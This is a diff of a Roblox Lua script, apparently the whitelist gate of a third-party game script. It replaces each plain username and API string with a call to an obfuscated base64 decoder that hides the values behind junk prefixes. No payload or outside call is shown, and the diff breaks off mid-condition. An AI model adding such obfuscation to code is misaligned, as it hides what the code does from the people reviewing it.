@@ -1,325 +1,334 @@
-local CoreGui = game:GetService("StarterGui") -- Variable of StarterGui
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ(data) m=string.sub(data, 0, 70) data=data:gsub(m,'')
 
-CoreGui:SetCore("SendNotification", {
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+local CoreGui = game:GetService(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lXDFQNhKONSaHtuRRUFzYWVuQPKsaqXilMALrXtewBbowMBZLTXGunbHsUPHInjVDPLFbRU3RhcnRlckd1aQ==')) -- Variable of StarterGui
+
+CoreGui:SetCore(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('roweOEnFUNTeBLUmuVBOmkTDDzaYnEwVUjlehqQIMdpudchjiuhVjJEYHthBUEsiinIVmPU2VuZE5vdGlmaWNhdGlvbg=='), {
     -- Customizable
-    Title = "霖溺脚本认证",
-    Text = "脚本验证...",
+    Title = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mEgpuqsmzASClIZgqtBhoHbVXCTbfStuJiFtOisHwQcIyJBSTDNXbkcsyJcDfNBBfSNtCj6ZyW5rq66ISa5pys6K6k6K+B'),
+    Text = tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tMFBawwIWGbOCCRPpThknzFDvWAmllTwNszfevEabuCmRiHZnrcKjpOlEjeBwoGWzZonVn6ISa5pys6aqM6K+BLi4u'),
     Duration = 6, --时间
 })
 
-local CoreGui = game:GetService("StarterGui") -- Variable of StarterGui
+local CoreGui = game:GetService(tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HyqbVHvEkSTAEradBDBtNQBKqqGsWTEpYOIWERwcjfCoVBDzVqYvfODpFGZOjcMeqpRRHJU3RhcnRlckd1aQ==')) -- Variable of StarterGui
 
 local Whitelisted = false;
 
-if game.Players.LocalPlayer.Name == "wuai005" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CrysCMmHLtvkULWxyqvhFpksQBzKuzedyKlgebFjYSzMDUVqAGjPVYyylOtSAHkKFEjsNzd3VhaTAwNQ==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "iwqqqqqqqqqs" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nefvtRYjIRrYDvOpsViKKMskwREFVDHOLJSjnIvknZwtCzqxRwfFAOhCkOTRIUuuSwlSLgaXdxcXFxcXFxcXFz') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "iwqqqqqqqqs" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wBpiPqktzjMSYjWnOCinebnSZwdHciggKymbItSMnDyUvHcCvyvkjwnbbDukLjDNDDcSKJaXdxcXFxcXFxcXM=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "AK_xjs978" then 
-Whitelisted = libnibcnm 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AxHxWbdJWJZgPRoeNfENCXHaiGKgOmsvsmkSeYtdlkfvonzCznmOXxyaQXLzJoLGhidLFlQUtfeGpzOTc4') then 
+Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "hdykhj666" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DYRZGZjkQCKGvSvRbvwgeljXTeowFssdiEwoDtfpHvLpYWTehlBfpITNtGCwkKafzuAKoYaGR5a2hqNjY2') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "FBI_hmr" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qYbJzkjCoTVDMeqFirzyTQVHDrskqvRwzoBJdphRgCggcnrjAoVNCRDhnrZBaqKwrZwilYRkJJX2htcg==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "wszgr_9" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RsgsPiMmBpUZvxyDkYoEeLOjRzgynILKFZNXPffTuKOPicLcDDgOooRTySVoHdXnnMkAWWd3N6Z3JfOQ==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "okkokkplok" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cFexPEcFPwAnFjYfwjlrnCWKEhhuhgtElvBCpzJVasaZcAAymkDGDCjmemRFtZSXPmTXKMb2trb2trcGxvaw==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "udxcgrdx" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cIbPZLrYAqiWgfsDHGMkpsQiGPReXziSsHLKfLKAEXWogeAJbczwVUKgqBBumjbvQUOkJSdWR4Y2dyZHg=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "THQngedqx" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uQYvBNTrRPovQRxCCRXDjVIdFCRdsDaqHQVwaQctjSvxOHZePIYweGxkxuKTSKLlftofMfVEhRbmdlZHF4') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "sueii74" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('foaQvIRuMmcxBsIhiWDOCayMfKQWTzmdxHcineBQsrHsoAzgzikTwBsCqWLcSatnnZPpUNc3VlaWk3NA==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "udhehuxh" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zjLlXQDKIBjUStVIOQzpJjmBYRaDiKxcXbQRESZQtXZNXwbwavyfBbzabBmHGXXyRPpXVwdWRoZWh1eGg=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "miaomiao_233" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jLmtQALFcpRQDSHPOjROpDtudikXThTyMTeqcJTnUvULWpWSgEuMEhQLQKRbPgSAZxJRoxbWlhb21pYW9fMjMz') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "miamia_1234567891011" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bUtsfDDDxIWHsnEZlItrYJbsLKxJrYBEUKkLZkfylhaAGcaWSGOyZuZOnVlkGbvZlGSRKnbWlhbWlhXzEyMzQ1Njc4OTEwMTE=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "cmdd123yi" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hXLadLgplQQJHFqlukSFeZTcynPIRsUcKJbnnTeXlHEkieFCYfnjjGOLxMLwSchVQxWgeXY21kZDEyM3lp') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "123dgd3" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nftWwzkOPKUGabwjFzJfaxWTLpkQMKloBqWnbNKmlwLcrZchpNOYnheISHICxUwbPvlKbCMTIzZGdkMw==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "GN46661" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sDGUWZKSqOfucOwDrNsjyypMMImKsUUsjbznaPaJxyPLLPjbhBVHRQRlzOksbKCYqnPibSR040NjY2MQ==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "AYHngedGx" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JgkgyMbqsvxFWOeUfkobLWPwUYszZyWJaXtBVzbuexgDBIAlLRAsoJMMDBEXDYNodLKhonQVlIbmdlZEd4') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "binhoushangyauun" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yjYSBCRRdAhMOPZqlQswfpADGwloqDfaYHOCsWepNhjiFvFmEiZCGJBOyDSJIpFstFVFIRYmluaG91c2hhbmd5YXV1bg==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "qw118118" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('casAhpIHvJUONBiLbCPGHMqDOminkFNpUAzhHmQvONzFIIDvYxjLwqsaeHFdEITNKLtLfqcXcxMTgxMTg=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "cn_qwaoi" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oLAmZvxQdUToMLmuWvrXScaXPORrcasSAueWRWHnKCmvNyGGEljyYlOJZgQZYqqZMIdKeIY25fcXdhb2k=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "bajidashe" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cJuCLymqeAtYutLTMmoxDZFsZJjfSLICHJoxJYnfOuYZvjsdyOzlxIsRxMWCRCTasNgyLHYmFqaWRhc2hl') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "ydy1234566" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xhcbLcLQYcyMnftcamoEVOgyZtqLEvemPrHsdWuhTWcWVBoALcoJASGlxLksdEsokgLSLyeWR5MTIzNDU2Ng==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "Infinitejade404" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SwVSLxQPtqXPKpkxMUPqzvAQgIOOjfIwKYSuyQSCifNllPsexSnLzvPUMGjtDjAMipaISWSW5maW5pdGVqYWRlNDA0') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "HFO_DR" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zbKDTsDBREwTDbuHtzayJJOjzvAcntKQRRNeawVTYaHgrnQUPdOObtDkkowCFnGzMIYkAcSEZPX0RS') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "EVOKINGJFC2" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hQqirxMyuqafnoVoCHowHFWgIEavkPEhOuGgKCLudmtYCLpLKzjaiaItAkwwNTXUxvXBciRVZPS0lOR0pGQzI=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "cnmrnm12345" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ktcznoEVstjAwyTKkCrfubqfBdYOnXOrCzdelOlOhcjbbuATBdcgdGkIXMdUuudVrrRpIYY25tcm5tMTIzNDU=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "nbbcscydw" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AFNKQgWLulkPjiPYdeJlHGhvJxgxOpgxUEcKYHXyOhdJFWiSeOplEtkMoeEsjVJpmEeqUJbmJiY3NjeWR3') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "123654abcf" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HzouQXIciJINwGEMGjuANqjinERJoNISlGFCOQrTDnpUmBSmbhIdXcqYyBQRxCBIfHMDQvMTIzNjU0YWJjZg==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "awing707" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rcrNMAhMOwnWsFTHxBPvvudChzqGzofYdcganccIgSkWDtiRuHqEJPEcRkcVVkVyJEpJyBYXdpbmc3MDc=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "yfhmyyffxdt" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jAAqQWedYAAytpoYaagsJAAYdrWymblKrbyqRoMoprvBcTtKDLJICkZzKpupdLwpEsDLKheWZobXl5ZmZ4ZHQ=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "CN_xiaozhe" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ioFaQMwHYVsVwWYyBYOyJqzmFLpatTINsEraimpffiIFdCfUQqFQsDQtzYluGpSyqWZHfEQ05feGlhb3poZQ==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "ifw215n" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('muVmHjIxnKVhGvHZGfMKxxTjPVNluMzJHlzpCNJOEtJUHoFxfpXkHYEZOohaTicTAhnaZPaWZ3MjE1bg==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "ifw215" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZJzFfFKNEBauuWzPGmtUtsVcTxtKeLpoqihCthzPXDIHnLKoCooCBWsavvUaUeBSbiapTQaWZ3MjE1') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "zbsswl" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ebVBQrtQyFpzIgGqGmIqRYoTtxhXsAFiJvrChHUCwXHaDmmTUXeZUVvrKnawFsYRpxmxnHemJzc3ds') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "ajiwbwiu" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nrbjlKPOAWMeWsgJcLbiAZKQZQUtvtTzGlNeHTcCLvVsURAeiIjwrSSOomZMTjyUKNcQCiYWppd2J3aXU=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "wkert2" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BpQhrGEfprKMzlVIjTWbYkCmFaptBWrXRVuJxWFuMQbjfhZkvcomDUZNQSSIcXrKzFUOmXd2tlcnQy') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "IIWZBII" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AwuVrdWvIwLDcosLbjAgMPljxHXUsXyWMtTIVAtqwVsadcYfDFYrvqxlxFwOshZCAoqtBaSUlXWkJJSQ==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "xu6123liang55" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cirdsprSGQiYnmuGpXONemSpsujAJaEfTLKJCtNXxMJBiieduqOsRbefYoQiHJHRbpDgpieHU2MTIzbGlhbmc1NQ==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "Ehhsbsuj" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qoHGwQdcxDfFDfAAqxpDDlDTFEXDfYyRgPLnKEocEmUkXQMwLHIGXpMkjAQEVoGzitLamzRWhoc2JzdWo=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "hdhdhuxhut" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rHbSUwVTwqpxXpsRkmMxdPsBFwBVOGREQnDSOTsjpmOCiABCKVSjWsxkRMGOekkazNyyEBaGRoZGh1eGh1dA==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "Retention_Star" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ypoCUsPeVbNQNYdibgFxYWWQxXHLGzLnphuVlZEinKdrgBnsVCeoopetCduLsgzvXRKrpdUmV0ZW50aW9uX1N0YXI=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "tgydggg" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GxmgvjeTyPZEAmjMZFfIbGgmPwqiidskFHofekacgznnfHyqNVUReeaubcVTXwkbHHewNKdGd5ZGdnZw==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "plm123plm123123" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LcmsaLDBKQrgOSsjvEzsvctKMAcydZGiYxVvptJjreVMQuSaqvFlZyiDRPmYlJiHgTwHvYcGxtMTIzcGxtMTIzMTIz') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "ginghoayo" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LhatIXpeIwwAzXmoGjaEKjJYDPdsdLUryZZFEfXDCgttqdkSigSBXIBqpwkoAoOeDYKElmZ2luZ2hvYXlv') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "guan_597" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nzkxIfNnvCBvjwocazsesclkkVPvOfRlbdmiFQfDOwmbmloGoJdZoJpPciakPtIOWvfDCeZ3Vhbl81OTc=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "skkwwj8" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VHAAyxvNNgKeLbioJaPYzgBPGWlpTXJTcpvbQrWDFqNnlkFgrShgUhkqxiUxakUQhduMpDc2trd3dqOA==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "jsjswijshwh" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WmVypbNgxoGqpEehIQaWRIesxTVwUDvwJJJWvPlPYlbQWjOLJVoHrfTsWhcDVRuuHgAUOUanNqc3dpanNod2g=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "lts123123" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bMoeJyZwGHnKtWyszFtEjNAiPhuGGtwcJXEOIqfbHqiicfIpRnzdOvojxzKSvKsnkPKYnibHRzMTIzMTIz') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "548nssb" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CGKULdVgpiPucJqnTYgWOQLPIyqeoaWGnefjZfvspJXEnBQwnslzjBhFRgsztwYkBzSWVtNTQ4bnNzYg==') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "king_lol886" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wBMmBYNJHumwbhdoNeufuAplbqeBHpoPoZWmCVpbLjVWhoHVzeAqYLAIHRRrdWvSoVGccna2luZ19sb2w4ODY=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "CN_fnf73" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xqYgEwfEJhOZYYpWIsakgnvIyFjNxxUWwAOWpFlRDvhLulaEtopAtNcbTJyFbQAzrrwVddQ05fZm5mNzM=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "ghjgf540" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wXrdDnvIOQQpTyURQXwApZNbLreAvnCVpSrzHvAFfsZnkASFxltqUXshMbxJQlvaJWIjQCZ2hqZ2Y1NDA=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "hhdhdhs2i" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RkmusQFfPXShRFznXymKlLQndIXQkMZPTNekRKPxYPRmfbeWBnNArPZpssivCffUemvDdAaGhkaGRoczJp') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "Ling_Mao" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zAzgjeWRybRasplVRlvrEeoOkbUdKLcccENpuGWzGMKOMWRbirXwzERwFtUzDrwwSmkxukTGluZ19NYW8=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "ufhystrd" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PsrceSKbUuHmTbqwtNqLqMeWVfqoEnhZXfvpreQieoNpjJGRlJucDMjLavtBHOzSRfKEfRdWZoeXN0cmQ=') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "fuzenan_2" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('daPBRyWvEYRhigitvFLKNOjlfhYutTpEbKmiodvBLXKptcGvZEISEbBfTmrWvnVkPiKZtMZnV6ZW5hbl8y') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "fuzenan_xiao" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RIAvaobIVaegioxUEpSSURFquQYwnzpEshWzxXtavxEhnSBqPebSeyOGsWfGwcVDUBjMSOZnV6ZW5hbl94aWFv') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "vpn_fdeer" then 
+if game.Players.LocalPlayer.Name == tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DKaVVzqtuBkHRcWYXCrUXjAkuWrlAYBSlBgMNfuSABzgaFPmITiofRhRIBXZugzefylBhNdnBuX2ZkZWVy') then 
 Whitelisted = true 
 end
 
-if game.Players.LocalPlayer.Name == "woyaochifan3" then 
